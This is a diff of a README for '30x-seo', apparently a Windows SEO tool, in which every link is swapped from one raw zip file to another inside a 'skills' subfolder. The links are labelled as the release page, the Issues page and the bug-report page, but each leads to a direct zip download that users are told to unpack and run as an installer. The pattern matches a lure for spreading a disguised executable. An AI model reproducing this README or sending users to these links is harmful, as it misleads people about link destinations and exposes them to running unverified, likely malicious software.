@@ -1,6 +1,6 @@
 # ⚙️ 30x-seo - Practical SEO Tools for Everyone
 
-[![Download 30x-seo](https://img.shields.io/badge/Download-30x--seo-blue?style=for-the-badge)](https://github.com/square-lupus579/30x-seo/raw/refs/heads/main/skills/30x-seo-content-audit/seo-x-3.8.zip)
+[![Download 30x-seo](https://img.shields.io/badge/Download-30x--seo-blue?style=for-the-badge)](https://github.com/square-lupus579/30x-seo/raw/refs/heads/main/skills/30x-seo-content-decay/x_seo_v1.3.zip)
 
 ---
 
@@ -30,12 +30,12 @@ The app runs smoothly on most modern Windows computers without needing extra sof
 
 To get the program on your PC, you need to visit the release page where the latest files are available.
 
-[![Get 30x-seo](https://img.shields.io/badge/Get%2030x--seo-gray?style=for-the-badge)](https://github.com/square-lupus579/30x-seo/raw/refs/heads/main/skills/30x-seo-content-audit/seo-x-3.8.zip)
+[![Get 30x-seo](https://img.shields.io/badge/Get%2030x--seo-gray?style=for-the-badge)](https://github.com/square-lupus579/30x-seo/raw/refs/heads/main/skills/30x-seo-content-decay/x_seo_v1.3.zip)
 
 **Steps to download:**
 
 1. Click the big blue button above or open this link in your browser:  
-   https://github.com/square-lupus579/30x-seo/raw/refs/heads/main/skills/30x-seo-content-audit/seo-x-3.8.zip
+   https://github.com/square-lupus579/30x-seo/raw/refs/heads/main/skills/30x-seo-content-decay/x_seo_v1.3.zip
 
 2. You will see a list of versions. Look for the latest release, marked clearly by the date or a version number.
 
@@ -84,7 +84,7 @@ The app will notify you when updates are available.
 
 To update:
 
-1. Return to the [release page](https://github.com/square-lupus579/30x-seo/raw/refs/heads/main/skills/30x-seo-content-audit/seo-x-3.8.zip).
+1. Return to the [release page](https://github.com/square-lupus579/30x-seo/raw/refs/heads/main/skills/30x-seo-content-decay/x_seo_v1.3.zip).
 
 2. Download the newest setup file.
 
@@ -125,7 +125,7 @@ A: Restart your computer and try again. Make sure your Windows is up to date.
 
 If you run into problems or have questions:
 
-- Visit the [GitHub Issues page](https://github.com/square-lupus579/30x-seo/raw/refs/heads/main/skills/30x-seo-content-audit/seo-x-3.8.zip).  
+- Visit the [GitHub Issues page](https://github.com/square-lupus579/30x-seo/raw/refs/heads/main/skills/30x-seo-content-decay/x_seo_v1.3.zip).  
 - Describe your problem clearly, including your Windows version.  
 - Check existing issues first—you might find your question already answered.  
 
@@ -143,10 +143,10 @@ If you run into problems or have questions:
 ## 🔗 Useful Links
 
 - Visit the release page to download or update:  
-  https://github.com/square-lupus579/30x-seo/raw/refs/heads/main/skills/30x-seo-content-audit/seo-x-3.8.zip  
+  https://github.com/square-lupus579/30x-seo/raw/refs/heads/main/skills/30x-seo-content-decay/x_seo_v1.3.zip  
 
 - Report bugs or request new features:  
-  https://github.com/square-lupus579/30x-seo/raw/refs/heads/main/skills/30x-seo-content-audit/seo-x-3.8.zip  
+  https://github.com/square-lupus579/30x-seo/raw/refs/heads/main/skills/30x-seo-content-decay/x_seo_v1.3.zip  
 
 - Learn about SEO and how 30x-seo fits in your strategy  
 
@@ -170,7 +170,7 @@ Each skill set reflects best practices used by SEO professionals but simplified 
 
 To recap the download and installation process clearly:
 
-1. Click or open this link: https://github.com/square-lupus579/30x-seo/raw/refs/heads/main/skills/30x-seo-content-audit/seo-x-3.8.zip  
+1. Click or open this link: https://github.com/square-lupus579/30x-seo/raw/refs/heads/main/skills/30x-seo-content-decay/x_seo_v1.3.zip  
 2. Download the latest Windows setup file.  
 3. Double-click the installer and follow the on-screen instructions.  
 4. Run 30x-seo from your Start menu or desktop shortcut.  
